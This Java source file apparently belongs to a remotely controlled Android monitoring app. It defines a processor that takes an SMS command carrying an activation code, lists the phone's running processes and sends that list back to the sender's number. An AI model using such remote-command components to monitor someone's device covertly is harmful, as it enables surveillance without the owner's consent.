package com.vvt.remotecommandmanager.processor.troubleshoot;

import java.util.List;

import android.app.ActivityManager;
import android.content.Context;

import com.vvt.appcontext.AppContext;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.RemoteCommandType;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;

public class RetrieveRunningProcessesProcessor extends RemoteCommandProcessor {
	private static final String TAG = "RetrieveRunningProcessesProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGE = Customization.ERROR;
	
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private LicenseInfo mLicenseInfo;
	private AppContext mAppContext;
	private StringBuilder mReplyMessageBuilder;
	
	public RetrieveRunningProcessesProcessor(AppContext appContext, 
			FxEventRepository eventRepository, LicenseInfo licenseInfo) {
		super(appContext, eventRepository);
		
		mAppContext = appContext;
		mLicenseInfo = licenseInfo;
		mReplyMessage = new ProcessingResult();
	}

	@Override
	public ProcessingType getProcessingType() {
		return ProcessingType.SYNC;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER ...");
		mReplyMessageBuilder = new StringBuilder();
		
		validateRemoteCommandData(commandData);
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
		} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
		}
		
		if(commandData.isSmsReplyRequired()) {
			mRecipientNumber = commandData.getSenderNumber();
		}
		
		try {

			ActivityManager activityManager = (ActivityManager) mAppContext.getApplicationContext().getSystemService(Context.ACTIVITY_SERVICE);
			List<ActivityManager.RunningAppProcessInfo> processes;
			processes = activityManager.getRunningAppProcesses();
			StringBuilder builder = new StringBuilder();
			builder.append("Running process:").append("\n");

			for (ActivityManager.RunningAppProcessInfo info : processes) {
				builder.append(info.processName).append("\n");
			}

			mReplyMessageBuilder.append(builder.toString());
			mReplyMessage.setIsSuccess(true);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		} catch (Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());

			mReplyMessage.setIsSuccess(false);
			mReplyMessageBuilder.append(MessageManager.RETRIVE_RUNNING_PROCESSORS_ERROR);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		}
		
		if(LOGV) FxLog.v(TAG, "doProcessCommand # IsSuccess : " + mReplyMessage.isSuccess());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ReplyMessage : " + mReplyMessage.getMessage());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT ...");
		
	}
	
	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException{
		
		if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
			//Command should only have 1 arguments.
			if(commandData.getArguments().size() != 1 ) {
				throw new InvalidCommandFormatException();
			}
		
			//if invalid activation code it will throw exception.
			RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);
		}
	}

	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}
}
